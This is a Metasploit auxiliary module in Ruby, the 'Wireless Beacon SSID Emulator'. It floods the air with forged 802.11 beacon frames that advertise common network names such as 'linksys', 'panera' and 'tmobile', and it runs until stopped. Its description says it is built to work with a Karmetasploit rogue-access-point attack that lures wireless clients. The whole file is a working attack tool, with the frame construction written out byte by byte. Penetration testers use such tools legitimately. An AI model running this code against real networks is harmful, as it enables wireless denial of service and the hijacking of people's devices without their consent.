##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Lorcon
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireless Beacon SSID Emulator',
      'Description'    => %q{
        This module sends out beacon frames using SSID's identified in a
        specified file and randomly selected BSSID's.  This is useful when
        combined with a Karmetasploit attack to get clients configured to
        not probe for networks in their PNL to start probing when they see a
        matching SSID in from this script.  For a list of common SSID's to
        use with this script, check http://www.wigle.net/gps/gps/main/ssidstats.
        If a file of SSID's is not specified, a default list of 20 SSID's will
        be used. This script will run indefinitely until interrupted.
      },

      'Author'         => [ 'joswr1ght', 'hdm' ],
      'License'        => MSF_LICENSE
    ))
    register_options(
      [
        OptString.new('SSIDS_FILE', [ false,  "Filename of SSID's to broadcast, one per line"])
      ], self.class)
  end


  def run

    @@uni = 0

    frames = []

    open_wifi

    ssidlist = []
    if datastore['SSIDS_FILE']
      begin
        ssidfile = File.new(datastore['SSIDS_FILE'], "r")
      rescue ::Exception
        print_status("Couldn't read from \"#{datastore['SSIDS_FILE']}\": #{$!}")
        return
      end
      ssidfile.each_line do |line|
        ssidlist.push line.chomp
      end
    else
      ssidlist = ["linksys", "default", "NETGEAR", "Belkin54g", "Wireless",
        "WLAN", "home", "DLINK", "smc", "tsunami", "tmobile", "101", "panera",
        "hhonors", "GlobalSuiteWireless", "Internet", "WiFi", "public", "guest",
        "test"]
    end

    print_status("Sending beacon frames...")

    while (true)
      ssidlist.each do |ssid|
        #print_status("Sending frame for SSID #{ssid}")
        frame = create_frame(ssid)
        wifi.write(frame)
      end
    end
  end


  def create_frame(ssid)
    mtu      = 1500 # 2312 # 1514
    ies      = rand(1024)

    bssid    = "0" + ssid[0..4]
    seq      = [rand(255)].pack('n')

    frame =
      "\x80" +                      # type/subtype
      "\x00" +                      # flags
      "\x00\x00" +                  # duration
      "\xff\xff\xff\xff\xff\xff" +  # dst
      bssid +                       # src
      bssid +                       # bssid
      seq   +                       # seq
      Rex::Text.rand_text(8) +      # timestamp value
      "\x64\x00" +                  # beacon interval
      "\x04\x01" +                  # capability flags

      # ssid tag
      "\x00" + ssid.length.chr + ssid +

      # supported rates
      "\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48" +

      # current channel
      "\x03" + "\x01" + channel.chr

    return frame

  end
end
